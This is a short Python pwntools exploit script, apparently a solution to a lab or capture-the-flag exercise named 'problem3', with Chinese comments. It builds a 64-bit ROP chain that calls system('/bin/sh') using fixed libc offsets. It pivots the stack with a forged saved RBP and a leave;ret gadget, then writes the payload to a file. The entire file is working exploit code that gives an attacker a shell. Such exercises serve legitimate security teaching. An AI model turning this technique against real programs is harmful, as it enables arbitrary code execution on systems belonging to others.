# solve3.py
from pwn import *

# --- [ 关键修正 ] ---
# 明确告诉 pwntools 我们正在处理 64 位程序
context.arch = 'amd64'
# --- END 修正 ---

# --- 1. 关键地址配置 (基于你提供的 GDB 数据) ---
# 这是你在 GDB 中找到的 buffer 地址 (rdi)
BUFFER_ADDR = 0x7fffffffd780 

# Libc 基地址 (基于 Problem 4 关闭 ASLR 后的结果)
LIBC_BASE = 0x7ffff7c00000

# 根据 Libc 基地址计算出的 Gadget
POP_RDI   = LIBC_BASE + 0x10f78b
SYSTEM    = LIBC_BASE + 0x58750
BIN_SH    = LIBC_BASE + 0x1cb42f
RET       = 0x40101a          # 用于栈对齐，防止 system crash

# leave; ret Gadget (用于栈迁移)
# 这个地址来自 problem3 本身的汇编代码 (0x4013a6)
LEAVE_RET = 0x4013a6 

# --- 2. 构建 Payload ---
# 目标: 将 Stack Pointer (RSP) 劫持到我们的缓冲区开头

# 2.1 真正的 ROP 链 (放在缓冲区开头)
# 这一串指令正好 32 字节，填满缓冲区
real_chain = flat([
    RET,        # 1. 额外的 ret 用于对齐栈 (16字节对齐)
    POP_RDI,    # 2. 准备参数
    BIN_SH,     # 3. 参数 "/bin/sh"
    SYSTEM      # 4. 调用 system
])

# 2.2 伪造旧的 RBP (Stack Pivot 的核心)
fake_rbp = BUFFER_ADDR - 8

# 2.3 组装 Payload
# [32字节 ROP链] + [8字节 伪造RBP] + [8字节 劫持返回地址]
payload = real_chain + p64(fake_rbp) + p64(LEAVE_RET)

# --- 3. 生成攻击文件 ---
with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Payload generated using Buffer Addr: {hex(BUFFER_ADDR)}")
print("Run: ./problem3 ans3.txt")